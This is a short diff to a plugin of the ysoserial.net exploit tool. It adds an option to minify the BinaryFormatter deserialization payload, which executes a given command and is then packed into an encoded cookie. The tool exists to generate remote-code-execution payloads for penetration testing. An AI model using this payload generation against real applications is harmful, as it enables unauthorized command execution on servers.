@@ -25,11 +25,13 @@ namespace ysoserial.Plugins
     {
         static string command = "";
         static Boolean test = false;
+        static Boolean minify = false;
 
         static OptionSet options = new OptionSet()
             {
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null }
             };
 
         public string Name()
@@ -82,7 +84,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+            byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
             DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
             ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
             byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
